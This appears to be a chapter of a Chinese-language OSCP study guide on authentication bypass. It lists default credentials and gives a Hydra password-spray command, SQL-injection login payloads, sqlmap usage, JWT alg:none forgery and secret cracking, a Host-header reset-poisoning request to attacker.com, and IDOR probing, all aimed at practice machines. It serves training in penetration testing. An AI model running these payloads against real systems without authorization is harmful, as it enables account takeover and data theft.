# Ch 15 — 身份驗證繞過：預設憑證、弱 JWT、登入繞過

> 目標：掌握繞過身份驗證的常見技術，包含預設憑證、SQLi 登入繞過、JWT 竄改、密碼重設邏輯漏洞。

## 為什麼身份驗證漏洞這麼常見

大多數 OSCP 靶機都有某種身份驗證問題。不是因為靶機刻意設計成爛，而是因為**現實世界的應用確實爛**：

- 管理員不改預設密碼
- 開發者用了爛的 JWT 驗證
- 登入邏輯有 SQL 注入
- 密碼重設流程設計不良

## 預設憑證

**第一步永遠是試預設憑證。**

常見的預設組合：

```
admin:admin
admin:password
admin:12345
admin:admin123
root:root
administrator:password
guest:guest
user:user

# 特定服務的預設
Tomcat:  tomcat:tomcat, admin:admin
Jenkins: admin:admin, admin:password
Webmin:  admin:admin
DVWA:    admin:password
WordPress: admin:admin
phpMyAdmin: root:（空白）
```

### 找特定服務的預設憑證

```bash
# 搜尋
searchsploit "default credentials" servicename
# 或直接 Google: "<service name> default credentials"
```

SecLists 裡也有預設憑證清單：

```bash
cat /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

### 密碼 Spray（避免帳號鎖定）

當有多個帳號時，用一個密碼試所有帳號，避免單一帳號嘗試太多次被鎖定：

```bash
# Hydra password spray
hydra -L users.txt -p Password123 http-post-form://target.com/login:'username=^USER^&password=^PASS^':'Invalid credentials'
```

## SQLi 登入繞過

登入表單通常用 SQL 驗證，如果有注入：

```sql
-- 後端 SQL 可能長這樣
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- 輸入 admin'-- 作為使用者名：
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- -- 之後全被忽略，只要 username 正確就能登入

-- 其他萬用注入：
username: ' OR 1=1--
username: admin'--
username: ' OR 'x'='x
username: ') OR ('x'='x
```

```bash
# 在 Burp Repeater 測試：
POST /login
username=admin'--&password=anything

# 或用 sqlmap
sqlmap -u http://target/login --data="username=admin&password=admin" --forms
```

## JWT（JSON Web Token）漏洞

JWT 結構：`header.payload.signature`，全部 Base64 編碼

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
HMACSHA256(header+payload, secret)
```

### 解碼 JWT

```bash
# Base64 解碼（JWT 用的是 URL-safe Base64）
echo "eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9" | base64 -d
# 輸出：{"username":"user","role":"user"}
```

網站工具：jwt.io

### 漏洞一：Algorithm None

有些 JWT 實作允許 `alg: none`，完全跳過簽章驗證：

```bash
# 修改 header 和 payload，移除 signature
# 原始 header：{"alg":"HS256","typ":"JWT"}
# 修改為：{"alg":"none","typ":"JWT"}

# 修改 payload：{"username":"admin","role":"admin"}

# 新的 JWT：
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
echo -n '{"username":"admin","role":"admin"}' | base64 | tr -d '='
# 組合：header.payload.（注意：signature 為空，但要保留最後的點）
```

### 漏洞二：弱 Secret 破解

```bash
# 用 hashcat 破解 JWT 的 HMAC secret
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# token.txt 放完整的 JWT 字串
```

用 jwt_tool：

```bash
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

### 漏洞三：RS256 → HS256 混淆

如果伺服器使用 RS256，但有些實作也接受 HS256，可以用公鑰作為 HS256 的 secret：

```bash
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

## 密碼重設漏洞

### 可預測的 Token

```python
# 有些實作用時間戳或弱隨機數生成 token
# 如果你能猜到 token 的生成方式，就能重設別人的密碼
```

### 可操控的 Host Header

```http
POST /reset-password
Host: attacker.com   ← 改這個
Content-Type: application/x-www-form-urlencoded

email=admin@target.com
```

如果應用用 Host header 生成重設連結，連結會發到你控制的網域。

### Token 不失效

請求一個重設 token，但不使用，之後再用。有些實作不讓 token 失效。

## IDOR（直接物件引用）

不是嚴格的「身份驗證繞過」，但很相關：

```
GET /user/profile?id=1          → 你自己的
GET /user/profile?id=2          → 別人的？

# 改 id 看能不能讀其他使用者的資料
# 考試中經常出現：能讀 admin 的資料或修改別人的東西
```

## 實戰流程

```
1. 找登入頁面 → 試預設憑證
2. Burp Proxy 攔截登入請求
3. 試 SQLi 登入繞過（username=admin'--）
4. 找密碼重設功能，檢查 token 強度
5. 找所有有 Cookie 的頁面，看有沒有 JWT
6. 找所有有 id/user 參數的請求，試 IDOR
```

## 本章對應靶機

| 機器 | 身份驗證漏洞 |
|------|------------|
| HTB Jerry | Tomcat 預設憑證 → WAR 檔上傳 |
| HTB Cronos | SQLi 登入繞過 |
| THM OWASP Juice Shop | 完整 OWASP 練習，含多種 auth 漏洞 |
| THM Authentication Bypass | 專門練習 |

## 自我檢核

- [ ] 知道 Tomcat、Jenkins、WordPress 的預設憑證
- [ ] 能用 `admin'--` 試 SQLi 登入繞過
- [ ] 能用 Base64 手動解碼 JWT 並理解 payload
- [ ] 知道 JWT alg:none 攻擊的原理

→ [練習 B：4 台 Web 主題 HTB 機器](./practice-b-web-attacks.md)
